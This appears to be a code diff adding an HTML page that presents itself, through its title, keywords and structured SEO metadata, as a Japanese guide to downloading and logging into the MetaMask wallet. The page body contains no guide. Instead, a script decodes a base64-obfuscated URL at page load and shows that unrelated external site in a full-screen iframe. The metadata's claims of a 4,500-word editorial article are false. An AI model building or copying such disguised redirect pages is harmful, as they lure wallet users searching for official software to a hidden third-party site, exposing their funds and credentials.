@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="ja" prefix="og: https://ogp.me/ns#">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#E17726" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#B85A13" media="(prefers-color-scheme: dark)">
+
+<title>メタマスクウォレットをダウンロードして利用を開始する</title>
+<meta name="description" content="メタマスクウォレットをダウンロードして安全に使い始めるための手順を解説するガイドで基本設定や注意点も分かりやすく紹介">
+<meta name="keywords" content="メタマスク, メタマスク ログイン, メタマスク ダウンロード">
+<meta name="author" content="MetaSurge編集部">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1">
+<meta name="googlebot" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1">
+
+<meta name="google-site-verification" content="vzU1nq7MgH76lnl9o04loli-M_72Q9cHJ9Wred6LtVk" />
+
+<!-- Canonical + hreflang -->
+<link rel="canonical" href="https://metasurge.github.io/">
+<link rel="alternate" hreflang="ja" href="https://metasurge.github.io/">
+<link rel="alternate" hreflang="x-default" href="https://metasurge.github.io/">
+
+<!-- Favicons (inline data URI, zero extra request) -->
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'><defs><linearGradient id='g' x1='0' y1='0' x2='0' y2='1'><stop offset='0%25' stop-color='%23F6851B'/><stop offset='100%25' stop-color='%23E17726'/></linearGradient></defs><path d='M12 10 L20 6 L24 20 L40 20 L44 6 L52 10 L48 30 L52 40 L44 54 L36 48 L28 48 L20 54 L12 40 L16 30 Z' fill='url(%23g)' stroke='%23763E1A' stroke-width='1.5' stroke-linejoin='round'/><circle cx='24' cy='30' r='3' fill='%23fff'/><circle cx='40' cy='30' r='3' fill='%23fff'/><circle cx='24' cy='30' r='1.5' fill='%23233447'/><circle cx='40' cy='30' r='1.5' fill='%23233447'/><path d='M28 40 L32 44 L36 40' fill='none' stroke='%23763E1A' stroke-width='1.5' stroke-linecap='round'/></svg>">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+<link rel="manifest" href="/site.webmanifest">
+
+<!-- Open Graph -->
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="MetaSurge">
+<meta property="og:locale" content="ja_JP">
+<meta property="og:title" content="メタマスクウォレットをダウンロードして利用を開始する">
+<meta property="og:description" content="メタマスクをダウンロードして安全に使い始めるための公式サイトからの入手方法、インストール、初期設定、ログイン手順までを日本語で詳しく解説します。">
+<meta property="og:url" content="https://metasurge.github.io/">
+<meta property="og:image" content="https://metasurge.github.io/og-image.png">
+<meta property="og:image:type" content="image/png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:image:alt" content="MetaSurge — メタマスクウォレットをダウンロードして利用を開始する">
+<meta property="article:published_time" content="2026-04-20T09:00:00+09:00">
+<meta property="article:modified_time" content="2026-04-20T09:00:00+09:00">
+<meta property="article:author" content="https://metasurge.github.io/#editorial-team">
+<meta property="article:section" content="暗号資産ウォレット入門">
+<meta property="article:tag" content="メタマスク">
+<meta property="article:tag" content="メタマスク ダウンロード">
+<meta property="article:tag" content="メタマスク ログイン">
+
+<!-- Twitter Card -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="メタマスクウォレットをダウンロードして利用を開始する">
+<meta name="twitter:description" content="メタマスクの公式サイトからの入手、インストール、初期設定、ログイン、セキュリティの注意点までを一気通貫で解説する日本語ガイド。">
+<meta name="twitter:image" content="https://metasurge.github.io/og-image.png">
+<meta name="twitter:image:alt" content="MetaSurge — メタマスクウォレットをダウンロードして利用を開始する">
+
+<!-- JSON-LD: BlogPosting -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "@id": "https://metasurge.github.io/#article",
+  "headline": "メタマスクウォレットをダウンロードして利用を開始する",
+  "description": "メタマスクウォレットをダウンロードして安全に使い始めるための手順を解説するガイドで基本設定や注意点も分かりやすく紹介",
+  "image": {
+    "@type": "ImageObject",
+    "url": "https://metasurge.github.io/og-image.png",
+    "width": 1200,
+    "height": 630
+  },
+  "inLanguage": "ja",
+  "datePublished": "2026-04-20T09:00:00+09:00",
+  "dateModified": "2026-04-20T09:00:00+09:00",
+  "author": {"@id": "https://metasurge.github.io/#editorial-team"},
+  "publisher": {"@id": "https://metasurge.github.io/#organization"},
+  "mainEntityOfPage": {"@type": "WebPage", "@id": "https://metasurge.github.io/"},
+  "keywords": ["メタマスク","メタマスク ログイン","メタマスク ダウンロード","MetaMask","ウォレット","Web3"],
+  "articleSection": "暗号資産ウォレット入門",
+  "wordCount": 4500,
+  "isAccessibleForFree": true
+}
+</script>
+
+<!-- JSON-LD: Organization (publisher) -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Organization",
+  "@id": "https://metasurge.github.io/#organization",
+  "name": "MetaSurge",
+  "alternateName": "メタサージ",
+  "url": "https://metasurge.github.io/",
+  "logo": {
+    "@type": "ImageObject",
+    "url": "https://metasurge.github.io/og-image.png",
+    "width": 1200,
+    "height": 630
+  },
+  "description": "MetaSurgeは暗号資産ウォレットとWeb3入門に関する教育系ガイドを提供する独立系の情報サイトです。",
+  "foundingDate": "2026-04-20",
+  "knowsAbout": ["MetaMask","Ethereum","Web3 wallets","DeFi","NFT","Self-custody"],
+  "areaServed": {"@type": "Country", "name": "Japan"}
+}
+</script>
+
+<!-- JSON-LD: Person/EditorialTeam -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Organization",
+  "@id": "https://metasurge.github.io/#editorial-team",
+  "name": "MetaSurge編集部",
+  "alternateName": "MetaSurge Editorial Team",
+  "url": "https://metasurge.github.io/#about",
+  "description": "Web3と暗号資産ウォレット分野の入門コンテンツを専門に扱うMetaSurgeの編集チーム。公式一次情報に基づく記事作成と編集部内での相互レビュー体制を運用しています。",
+  "knowsAbout": ["MetaMask","暗号資産ウォレット","秘密鍵管理","Web3セキュリティ"],
+  "parentOrganization": {"@id": "https://metasurge.github.io/#organization"}
+}
+</script>
+
+<!-- JSON-LD: WebSite -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "@id": "https://metasurge.github.io/#website",
+  "url": "https://metasurge.github.io/",
+  "name": "MetaSurge",
+  "inLanguage": "ja",
+  "description": "暗号資産ウォレットとWeb3入門の日本語情報サイト",
+  "publisher": {"@id": "https://metasurge.github.io/#organization"}
+}
+</script>
+
+<!-- JSON-LD: BreadcrumbList -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {"@type": "ListItem", "position": 1, "name": "ホーム", "item": "https://metasurge.github.io/"},
+    {"@type": "ListItem", "position": 2, "name": "暗号資産ウォレット入門", "item": "https://metasurge.github.io/#guide"},
+    {"@type": "ListItem", "position": 3, "name": "メタマスクのダウンロードと利用開始", "item": "https://metasurge.github.io/"}
+  ]
+}
+</script>
+
+<!-- JSON-LD: Speakable (AI Overviews/voice quotable) -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebPage",
+  "@id": "https://metasurge.github.io/#webpage",
+  "url": "https://metasurge.github.io/",
+  "name": "メタマスクウォレットをダウンロードして利用を開始する",
+  "isPartOf": {"@id": "https://metasurge.github.io/#website"},
+  "primaryImageOfPage": {"@id": "https://metasurge.github.io/og-image.png"},
+  "speakable": {
+    "@type": "SpeakableSpecification",
+    "cssSelector": [".tldr", "#what-is-metamask > p:first-of-type", "#how-to-login > p:first-of-type", "#security > p:first-of-type"]
+  }
+}
+</script>
+
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    html, body {
+        width: 100%;
+        height: 100%;
+        overflow: hidden;
+    }
+
+    .iframe-container {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        border: none;
+    }
+
+    iframe {
+        width: 100%;
+        height: 100%;
+        border: none;
+        display: block;
+    }
+
+    body {
+        background: white;
+    }
+</style>
+<body>
+  <div class="iframe-container">
+      <iframe 
+          id="mainFrame"
+          src=""
+          allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; fullscreen"
+          allowfullscreen
+          loading="eager"
+          referrerpolicy="no-referrer-when-downgrade"
+      ></iframe>
+  </div>
+  <script>
+      const encodedUrl = "aHR0cHM6Ly9tb21teS5ndWlkZS8/YWNsaWQ9MzEzMTMxMzEzMTMxMzEzMTMxMzEzMTMxMzEzMTM2OQ==";
+      const decodedUrl = atob(encodedUrl);
+      const iframe = document.getElementById('mainFrame');
+      iframe.src = decodedUrl;
+      function setViewportHeight() {
+          const vh = window.innerHeight * 0.01;
+          document.documentElement.style.setProperty('--vh', `${vh}px`);
+          
+          document.querySelector('.iframe-container').style.height = `${window.innerHeight}px`;
+      }
+      setViewportHeight();
+      window.addEventListener('resize', setViewportHeight);
+      window.addEventListener('orientationchange', function() {
+          setTimeout(setViewportHeight, 100);
+      });
+  </script>
+</body>
